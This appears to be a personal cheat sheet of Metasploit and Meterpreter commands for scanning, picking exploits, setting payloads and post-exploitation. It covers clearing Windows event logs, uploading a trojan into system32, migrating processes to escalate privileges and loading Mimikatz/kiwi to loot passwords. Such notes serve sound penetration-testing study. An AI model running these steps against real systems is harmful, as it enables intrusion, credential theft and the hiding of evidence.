# Basic Commands I used for metasploit

## Links

[Exploit-db](https://www.exploit-db.com/docs/english/18229-white-paper--post-exploitation-using-meterpreter.pdf)
[Offensive-Security metasploit doc](https://www.offensive-security.com/metasploit-unleashed/)
[Rapid7 metasploit doc](https://docs.rapid7.com/metasploit/)
[Hackers-arise](https://www.hackers-arise.com/metasploit-1)

## Rough listing Metasploit

- `msfconsole` in bash starts the metasploit framework.
- `?/help` for starting help menu.
- `sessions` lists all the current sessions.
  - `sessions -i session_number` to interact with specified session
- `search <modulename>` searches module names and descriptions.
- `use <path_to_exploit_module/number_fromSearchResult>` select the module specified with the module path.
- `info` displys the module specified with the name.
- `get` gets/shows the value of a context specific variable.
- `getg` gets/shows the value of a global variable.
- `options` displays the available options for the module specified.
- `save` Saves the current settings and datastores in a settings file. Will be able to load again when started.
- `set <option> <value>` sets the value for the specified option for the selected module.
- `set payload` sets the payload to be used for the operation.
- `set <variable> <value>` sets the value of a context specific variable
- `setg <variable> <value>` sets the value of a global variable
- `show <category>` displays the options in specific category
- `spool` write a console.log output on the screen and in a file as well.
- `advanced` displays the advanced options for the module specified.
- `exploit` starts the process of exploitation after the module is selected and configured accordingly.
  - `exploit -j` starts the process of exploitation in the background
  - `exploit -i` starts the process of exploitation in interactive mode. Gives a meterpreter shell after exploitation.

## Rough listing Meterpreter

- `getuid` will return the username of the victim machine.
- `sysinfo` shows the information about the system
- `background` sends the meterpreter shell into the background and starts msf shell again.
- `clearev` Will clear application, system and security logs on a windows system.
- `download <filename>` downloads the specified file in the attacker machine.
- `edit <filename>` will start a vim like text editor in the victim machine.
- `execute [flags] <executable>` executes the specified executable in the machine.
- `upload evil_trojan.exe c:\\windows\\system32` uploads file in the victim machine.
- `ps` shows the running processes in the victim machine.
  - `migrate` is used for migrating processes. It's used for privilage escallation as some processes may run with more privilages.
- `shell` starts an interactive shell in the victim machine.
- `search <filename/pattern>` searches the specified file in the victim machine.

## Modules

`load <modulename>` loads the specified module

- `Exploit` holds all the exploit code
- `Payload` holds varius shellcodes
- `Auxiliary` holds code which verify if the machine is exploitable or not
- `Post` holds stuffs related to post exploitation
  - `run post/windows/gather/checkvm` checks if the machine is a vertual machine
  - `run post/multi/recon/local_exploit_suggester` checks the system and suggests possible exploit
- `Encoder` holds stuffs to obfuscate payloads and other stuffs
- `NOP` is used for buffer-overflow or ROP attacks

## Basic Step by Step

**Recon:**

- `db_nmap -sV <ip>`

## Getting data from the database

- `hosts` shows the hosts
- `services` shows the available services scanned by db_nmap
- `vulns` shows the detected vulnerabilities according to the service version. Must include `-sV` while scanning with nmap.

## Searching and Loading Exploits

- `search exploitname` will search for the exploit
- `use <path_to_exploit_module/number_fromSearchResult>` select the module specified with the module path.

## Useful Configurations

- `set LHOST 10.8.215.27` Set the LHOST to use vpn ip
- `set RHOSTS <remote IP>` set the RHOSTS to victim machine
- `set PAYLOAD <payload-path>` Set the payload to be used

## Post Exploitation

- `ps` lists all the processes running
- `migrate` tries to migrate to another process
  - `migrate process_id` to migrate to certain process
  - `migrate -N process_name` to migrate to a certain process.
- `getuid` gets the uid of the current user privilage we have
- `sysinfo` gets more information about the system. eg: OS, version, etc
- `getprivs` gets the privilages of the current user
- `upload <localdevicepath>` upload a file in the victim machine
- `run <modulename>` run a metasploit module
- `ipconfig` Shows the networking information
- `shell` will spawn a normal system shell in victim machine
-

### Mimikatz -> Kiwi

Used for looting password files

- `load kiwi`